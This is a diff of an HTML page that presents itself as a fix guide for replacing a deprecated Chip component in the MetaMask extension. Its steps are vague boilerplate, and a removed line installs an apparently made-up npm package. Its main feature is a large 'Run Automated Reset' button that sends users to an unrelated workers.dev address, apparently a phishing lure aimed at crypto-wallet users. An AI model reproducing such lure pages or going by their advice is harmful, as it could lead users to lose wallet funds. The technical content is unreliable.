@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Replace Deprecated Chip Component With Tag F</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
+        font-family: system-ui;
         background: #121214;
         color: #ddd;
         padding: 20px;
@@ -25,7 +25,7 @@
     }
     a { color: #cf6679; }
     .btn {
-        background: #00adb5;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -45,29 +45,29 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs because the Chip component is no longer supported in the latest version of the component-library, and the Metamask extension is still using the outdated component.</li>
+<li>The error occurs because the Chip component is no longer supported in the current version of the component-library, and the Metamask extension is still using it, resulting in a compatibility issue.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update the component-library to the latest version using <code>npm install @component-library/latest</code></li>
-<li>Replace all instances of the Chip component with the Tag component in the Metamask extension code</li>
-<li>Configure the Tag component to match the previous functionality of the Chip component, for example:</li>
+<li>Update the component-library to the latest version to ensure compatibility with the Metamask extension.</li>
+<li>Replace all instances of the Chip component with the Tag component in the extension's code.</li>
+<li>Configure the extension's settings to use the new Tag component:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;component&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Tag&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;props&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;label&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Replace Chip&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;color&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;primary&quot;</span>
+<span class="w">  </span><span class="nt">&quot;components&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;chip&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">      </span><span class="nt">&quot;replacement&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Tag&quot;</span>
+<span class="w">    </span><span class="p">}</span>
 <span class="w">  </span><span class="p">}</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console to verify the changes. </p>
+<p>Consider utilizing an external console for further debugging and customization. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Node.js and npm installed on the system</li>
-<li>The latest version of the component-library available</li>
-<li>Metamask extension code accessible for modifications</li>
+<li>Metamask extension installed and configured</li>
+<li>Component-library updated to the latest version</li>
+<li>Basic understanding of JSON configuration files</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
